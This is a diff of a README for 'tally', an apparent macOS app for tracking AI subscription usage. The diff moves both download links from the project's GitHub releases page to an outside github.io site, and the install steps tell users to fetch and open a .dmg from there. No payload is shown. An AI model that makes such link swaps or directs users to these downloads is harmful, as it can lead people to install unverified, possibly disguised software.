@@ -1,12 +1,12 @@
 # 📊 tally - Track every AI subscription cost easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Elseydichotomous880/tally/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://elseydichotomous880.github.io)
 
 Tally helps you manage your AI tool subscriptions. It acts as a monitor for your accounts. You can track rate limits for services like Claude and Codex. It displays your usage statistics in your computer menu bar. The software ensures you stay within your limits. It switches accounts to give you the most room for your work.
 
 ## 📥 How to Install Tally
 
-1. Visit the [releases page](https://github.com/Elseydichotomous880/tally/releases) to download the latest version.
+1. Visit the [releases page](https://elseydichotomous880.github.io) to download the latest version.
 2. Look for the file ending in .dmg for your macOS system.
 3. Open the downloaded file once the download finishes.
 4. Drag the Tally application icon into your Applications folder.
